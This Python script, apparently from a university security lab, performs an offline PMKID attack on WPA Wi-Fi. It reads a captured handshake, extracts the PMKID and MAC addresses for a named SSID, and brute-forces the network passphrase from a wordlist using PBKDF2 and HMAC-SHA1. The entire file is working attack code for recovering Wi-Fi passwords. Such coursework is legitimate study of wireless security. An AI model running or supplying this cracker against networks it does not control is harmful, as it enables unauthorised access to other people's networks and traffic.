#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Attack PMKID with Scapy
"""

__author__ = "Julien Béguin & Gwendoline Dössegger"
__copyright__ = "Copyright 2017, HEIG-VD"
__license__ = "GPL"
__version__ = "1.0"
__email__ = "abraham.rubinstein@heig-vd.ch"
__status__ = "Prototype"

import binascii
import hashlib
import hmac
from binascii import a2b_hex

from pbkdf2 import *
from scapy.all import *
from scapy.contrib.wpa_eapol import WPA_key


def customPRF512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


def main():
    # Read capture file -- it contains beacon, authentication, associacion, handshake and data
    wpa = rdpcap("PMKID_handshake.pcap")

    # The network to attack
    ssid = "Sunrise_2.4GHz_DD4B90"

    #Get the Association request who contains APmac address, Clientmac address and the ssid
    #We verify if the packet is from the network to attack
    for trame in wpa:
        if trame.subtype == 0x0 and trame.type == 0x0 and trame.info.decode("ascii") == ssid:
            APmac = a2b_hex(trame.addr1.replace(':', ''))
            Clientmac = a2b_hex(trame.addr2.replace(':', ''))
            print("AP:",APmac)
            print("CL:",Clientmac)
            break

    #A demande si on peut mettre en "dur" ou boucle précédente.. à voir ce qu'on préfère
    # APmac = a2b_hex(wpa[145].addr2.replace(':', ''))
    # Clientmac = a2b_hex(wpa[145].addr1.replace(':', ''))

    pmkid_test=b'0'
    # Get the pmkid from the first 4-way handshake
    for trame in wpa:
        if trame.subtype == 0x8 \
                and trame.type == 0x2 \
                and a2b_hex(trame.addr2.replace(':', '')) == APmac \
                and a2b_hex(trame.addr1.replace(':', '')) == Clientmac:

            # Get the value of the pmkid
            pmkid = trame.wpa_key[6:]

            # Get the value of the key Information MD5 (1) or SHA1 (2)
            crypto = trame.key_info & 0x3
            break

    # Get a list of passPhrase from the wordlist
    wordlist = open("wordlist.txt", "r")
    passPhrases = [x.strip() for x in wordlist.readlines()]
    wordlist.close()

    ssid = str.encode(ssid)

    print("SSID  :",ssid)
    print("APmac :",APmac)
    print("Clmac :",Clientmac)

    # Test chaque passPhrase
    for passPhrase in passPhrases:
        print("[+] Testing passphrase:", passPhrase)
        passPhrase = str.encode(passPhrase)

        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        # MD5 = 0x01 & SHA1 = 0x02
        if crypto == 0x01:
            pmk = pbkdf2(hashlib.md5, passPhrase, ssid, 4096, 32)
        else:
            pmk = pbkdf2(hashlib.sha1, passPhrase, ssid, 4096, 32)

        # Calculate the pmkid according to the passphrase
        pmkid_test = hmac.new(pmk, b"PMK Name"+APmac+Clientmac, hashlib.sha1)

        # Verify if the calculated pmkid  is correct
        if pmkid == pmkid_test.digest()[:16]:
            print("[#] You win ! The passphrase is : " + passPhrase.decode())
            break

if __name__ == '__main__':
    main()
